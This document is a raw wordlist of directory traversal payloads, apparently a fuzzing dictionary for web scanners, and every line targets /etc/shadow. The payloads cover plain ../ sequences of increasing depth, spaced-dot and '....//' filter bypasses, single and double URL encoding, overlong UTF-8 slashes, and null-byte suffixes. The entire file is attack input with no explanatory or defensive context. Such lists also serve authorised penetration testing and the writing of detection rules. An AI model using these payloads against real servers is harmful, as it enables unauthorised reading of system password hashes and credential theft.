/./etc/shadow
/././etc/shadow
/./././etc/shadow
/././././etc/shadow
/./././././etc/shadow
/././././././etc/shadow
/./././././././etc/shadow
/././././././././etc/shadow
/./././././././././etc/shadow
/././././././././././etc/shadow
/./././././././././././etc/shadow
/././././././././././././etc/shadow
/./././././././././././././etc/shadow
/././././././././././././././etc/shadow
/../etc/shadow
/../../etc/shadow
/../../../etc/shadow
/../../../../etc/shadow
/../../../../../etc/shadow
/../../../../../../etc/shadow
/../../../../../../../etc/shadow
/../../../../../../../../etc/shadow
/../../../../../../../../../etc/shadow
/../../../../../../../../../../etc/shadow
/../../../../../../../../../../../etc/shadow
/../../../../../../../../../../../../etc/shadow
/../../../../../../../../../../../../../etc/shadow
/../../../../../../../../../../../../../../etc/shadow
/. . /etc/shadow
/. . /. . /etc/shadow
/. . /. . /. . /etc/shadow
/. . /. . /. . /. . /etc/shadow
/. . /. . /. . /. . /. . /etc/shadow
/. . /. . /. . /. . /. . /. . /etc/shadow
/. . /. . /. . /. . /. . /. . /. . /etc/shadow
/. . /. . /. . /. . /. . /. . /. . /. . /etc/shadow
/. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/shadow
/. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/shadow
/. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/shadow
/. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/shadow
/. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/shadow
/. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/shadow
/...//etc/shadow
/...//...//etc/shadow
/...//...//...//etc/shadow
/...//...//...//...//etc/shadow
/...//...//...//...//...//etc/shadow
/...//...//...//...//...//...//etc/shadow
/...//...//...//...//...//...//...//etc/shadow
/...//...//...//...//...//...//...//...//etc/shadow
/...//...//...//...//...//...//...//...//...//etc/shadow
/...//...//...//...//...//...//...//...//...//...//etc/shadow
/...//...//...//...//...//...//...//...//...//...//...//etc/shadow
/...//...//...//...//...//...//...//...//...//...//...//...//etc/shadow
/...//...//...//...//...//...//...//...//...//...//...//...//...//etc/shadow
/...//...//...//...//...//...//...//...//...//...//...//...//...//...//etc/shadow
/....//etc/shadow
/....//....//etc/shadow
/....//....//....//etc/shadow
/....//....//....//....//etc/shadow
/....//....//....//....//....//etc/shadow
/....//....//....//....//....//....//etc/shadow
/....//....//....//....//....//....//....//etc/shadow
/....//....//....//....//....//....//....//....//etc/shadow
/....//....//....//....//....//....//....//....//....//etc/shadow
/....//....//....//....//....//....//....//....//....//....//etc/shadow
/....//....//....//....//....//....//....//....//....//....//....//etc/shadow
/....//....//....//....//....//....//....//....//....//....//....//....//etc/shadow
/....//....//....//....//....//....//....//....//....//....//....//....//....//etc/shadow
/....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/shadow
/..%2fetc/shadow
/..%2f..%2fetc/shadow
/..%2f..%2f..%2fetc/shadow
/..%2f..%2f..%2f..%2fetc/shadow
/..%2f..%2f..%2f..%2f..%2fetc/shadow
/..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow
/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow 
/%2e%2e%2fetc/shadow
/%2e%2e%2f%2e%2e%2fetc/shadow
/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow 
/%252e%252e%252fetc/shadow
/%252e%252e%252f%252e%252e%252fetc/shadow
/%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
/..%c0%afetc/shadow
/..%c0%af..%c0%afetc/shadow
/..%c0%af..%c0%af..%c0%afetc/shadow
/..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow
/./etc/shadow%00
/././etc/shadow%00
/./././etc/shadow%00
/././././etc/shadow%00
/./././././etc/shadow%00
/././././././etc/shadow%00
/./././././././etc/shadow%00
/././././././././etc/shadow%00
/./././././././././etc/shadow%00
/././././././././././etc/shadow%00
/./././././././././././etc/shadow%00
/././././././././././././etc/shadow%00
/./././././././././././././etc/shadow%00
/././././././././././././././etc/shadow%00
/../etc/shadow%00
/../../etc/shadow%00
/../../../etc/shadow%00
/../../../../etc/shadow%00
/../../../../../etc/shadow%00
/../../../../../../etc/shadow%00
/../../../../../../../etc/shadow%00
/../../../../../../../../etc/shadow%00
/../../../../../../../../../etc/shadow%00
/../../../../../../../../../../etc/shadow%00
/../../../../../../../../../../../etc/shadow%00
/../../../../../../../../../../../../etc/shadow%00
/../../../../../../../../../../../../../etc/shadow%00
/../../../../../../../../../../../../../../etc/shadow%00 
/. . /etc/shadow%00
/. . /. . /etc/shadow%00
/. . /. . /. . /etc/shadow%00
/. . /. . /. . /. . /etc/shadow%00
/. . /. . /. . /. . /. . /etc/shadow%00
/. . /. . /. . /. . /. . /. . /etc/shadow%00
/. . /. . /. . /. . /. . /. . /. . /etc/shadow%00
/. . /. . /. . /. . /. . /. . /. . /. . /etc/shadow%00
/. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/shadow%00
/. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/shadow%00
/. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/shadow%00
/. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/shadow%00
/. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/shadow%00
/. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/shadow%00
/...//etc/shadow%00
/...//...//etc/shadow%00
/...//...//...//etc/shadow%00
/...//...//...//...//etc/shadow%00
/...//...//...//...//...//etc/shadow%00
/...//...//...//...//...//...//etc/shadow%00
/...//...//...//...//...//...//...//etc/shadow%00
/...//...//...//...//...//...//...//...//etc/shadow%00
/...//...//...//...//...//...//...//...//...//etc/shadow%00
/...//...//...//...//...//...//...//...//...//...//etc/shadow%00
/...//...//...//...//...//...//...//...//...//...//...//etc/shadow%00
/...//...//...//...//...//...//...//...//...//...//...//...//etc/shadow%00
/...//...//...//...//...//...//...//...//...//...//...//...//...//etc/shadow%00
/...//...//...//...//...//...//...//...//...//...//...//...//...//...//etc/shadow%00
/....//etc/shadow%00
/....//....//etc/shadow%00
/....//....//....//etc/shadow%00
/....//....//....//....//etc/shadow%00
/....//....//....//....//....//etc/shadow%00
/....//....//....//....//....//....//etc/shadow%00
/....//....//....//....//....//....//....//etc/shadow%00
/....//....//....//....//....//....//....//....//etc/shadow%00
/....//....//....//....//....//....//....//....//....//etc/shadow%00
/....//....//....//....//....//....//....//....//....//....//etc/shadow%00
/....//....//....//....//....//....//....//....//....//....//....//etc/shadow%00
/....//....//....//....//....//....//....//....//....//....//....//....//etc/shadow%00
/....//....//....//....//....//....//....//....//....//....//....//....//....//etc/shadow%00
/....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/shadow%00
/..%2fetc/shadow%00
/..%2f..%2fetc/shadow%00
/..%2f..%2f..%2fetc/shadow%00
/..%2f..%2f..%2f..%2fetc/shadow%00
/..%2f..%2f..%2f..%2f..%2fetc/shadow%00
/..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow%00
/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow%00
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow%00
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow%00
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow%00
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow%00
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow%00
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow%00
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow%00 
/%2e%2e%2fetc/shadow%00
/%2e%2e%2f%2e%2e%2fetc/shadow%00
/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow%00
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow%00
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow%00
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow%00
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow%00
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow%00
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow%00
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow%00
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow%00
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow%00
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow%00
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow%00 
/%252e%252e%252fetc/shadow%00
/%252e%252e%252f%252e%252e%252fetc/shadow%00
/%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow%00
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow%00
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow%00
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow%00
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow%00
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow%00
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow%00
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow%00
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow%00
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow%00
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow%00
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow%00
/..%c0%afetc/shadow%00
/..%c0%af..%c0%afetc/shadow%00
/..%c0%af..%c0%af..%c0%afetc/shadow%00
/..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow%00
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow%00
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow%00
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow%00
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow%00
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow%00
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow%00
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow%00
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow%00
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow%00
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow%00
